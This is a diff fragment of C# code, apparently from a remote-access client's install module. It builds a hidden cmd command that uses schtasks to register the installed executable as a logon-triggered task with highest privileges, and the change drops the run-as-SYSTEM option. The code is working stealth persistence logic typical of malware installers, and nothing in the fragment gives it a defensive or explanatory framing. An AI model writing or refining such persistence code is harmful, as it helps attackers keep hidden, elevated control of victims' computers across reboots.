@@ -34,7 +34,7 @@ namespace Client.Install
                         Process.Start(new ProcessStartInfo
                         {
                             FileName = "cmd",
-                            Arguments = "/c schtasks /create /f /sc onlogon /ru system /rl highest /tn " + Path.GetFileNameWithoutExtension(currentProcess) + " /tr " + "'" + "\"" + installPath.FullName + "\"" + "' & exit",
+                            Arguments = "/c schtasks /create /f /sc onlogon /rl highest /tn " + Path.GetFileNameWithoutExtension(currentProcess) + " /tr " + "'" + "\"" + installPath.FullName + "\"" + "' & exit",
                             WindowStyle = ProcessWindowStyle.Hidden,
                             CreateNoWindow = true,
                         });
